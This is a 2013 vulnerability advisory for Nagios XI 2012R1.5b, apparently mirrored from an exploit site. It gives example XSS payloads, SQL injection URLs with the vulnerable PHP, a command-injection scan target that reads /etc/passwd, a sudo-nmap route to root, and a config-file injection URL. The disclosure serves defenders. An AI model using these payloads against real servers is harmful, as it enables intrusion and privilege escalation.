@@ -1,0 +1,97 @@
+id: 20294
+date: 02/05/2013
+title: Nagios XI 2012R1.5b XSS / Command Execution / SQL Injection / CSRF
+author: James Clawson
+cves: 
+
+Reflected XSS:
+Alert Cloud Component:
+Example URL:
+http://nagiosxiserver/nagiosxi/includes/components/alertcloud/index.php?width=800"}};
+alert('xss'); var aa={"a" : {"b" : "
+The vulnerable code in Alert Cloud's index.php appears to have been
+copied and pasted into several other components as well.
+Escalation Wizard:
+Example URL:
+http://nagiosxiserver/nagiosxi/includes/components/escalationwizard/escalationwizard.php?stage=4&config_name=ffffff'
+style='height:5000px;width:5000px;position:absolute;left:-1px;top:-1px'
+onmouseover='alert("xss")'/>
+
+
+Stored XSS:
+Nagios QL (aka Legacy Nagios Core Configuration Manager):
+Example:
+Using
+');alert('xss
+as the config name of a host escalation entry will result in the
+javascript being executed when a user tries to delete that host
+escalation entry.
+I believe that the Legacy Nagios Core Configuration Manager and the
+(regular, non legacy) Core Configuration Manager share configuration
+settings in a database. I was unable to test whether script injected
+via Nagios QL could be executed by using the (regular) Core
+Configuration Manager because the (regular) Core Configuration Manager
+appears to be broken in this release (?).
+
+
+Command Execution:
+Autodiscovery does not filter input properly. Any user can submit new
+jobs, even regular user accounts with read only access. Autodiscovery
+may not appear in the menu for some users, it may be necessary to
+browse directly to the autodiscovery page.
+Example (as the scan target): \; cat /etc/passwd \;
+Then look at the job results.
+Due to what seems to be (as far as I can tell) a very poorly thought
+out sudo rule, a user could upload a custom nmap script to the server
+and run it (through sudo) for easy root access.
+Yes, there is a sudo rule that allows apache to run nmap as root.
+Autodiscovery requires manual activation before it can be used (and
+this vulnerability exploited).
+Autodiscovery does use a nonce, but this can be bypassed with XSS.
+
+
+Not sure what to call this, content spoofing maybe?
+Whatever you would call it, this could be used for phishing (or whatever).
+Nagios XI Admin Panel:
+http://172.16.4.51/nagiosxi/admin/?xiwindow=http://w3c.org
+
+
+SQL Injection:
+Sorry about the poor examples below, they should be enough to
+demonstrate the point though.
+NagiosQL (aka Legacy Nagios Core Configuration Manager):
+Example URL:
+http://nagiosxiserver/nagiosql/admin/commandline.php?cname=a'+or+'a'='a
+Vulnerable Code:
+if (isset($_GET['cname']) && ($_GET['cname'] != "")) {
+        $strResult = $myDBClass->getFieldData("SELECT command_line
+FROM tbl_command WHERE id='".$_GET['cname']."'");
+There are other pages in NagiosQL that are also vulnerable.
+Escalation Wizard:
+Example URL:
+http://nagiosxiserver/nagiosxi/includes/components/escalationwizard/escalationwizard.php?stage=5&submitted=true&level='
+
+
+CSRF:
+NagiosQL (aka Legacy Nagios Core Configuration Manager)
+Escalation Wizard
+
+
+Configuration File Injection:
+Example URL:
+http://nagiosxiserver/nagiosxi/includes/components/escalationwizard/escalationwizard.php?config_name=CoolConfigDD&contacts[]=1&contactgroups[]=1&timeperiod=2&first=1&last=10&interval=1&done=false&stage=5&level=1&objecttype=host&submitted=true&options[]=d%0A}%0Adefine
+host%0A%23
+The 'options' GET parameter is limited to 20 characters (VARCHAR 20 in
+the DB) and is placed in the 'escalation_options' field in the
+hostescalations.cfg file.
+I'm not sure if it is possible to do anything useful with only 20
+characters, but I find it interesting none the less. The above example
+creates an empty host definition that doesn't mess up the config file.
+If an invalid configuration file is created, the last know good
+configuration is rolled back and nagios is restarted, so this cannot
+be used for denial of service.
+
+
+James Clawson
+
+#  0day.today [2023-03-26]  #
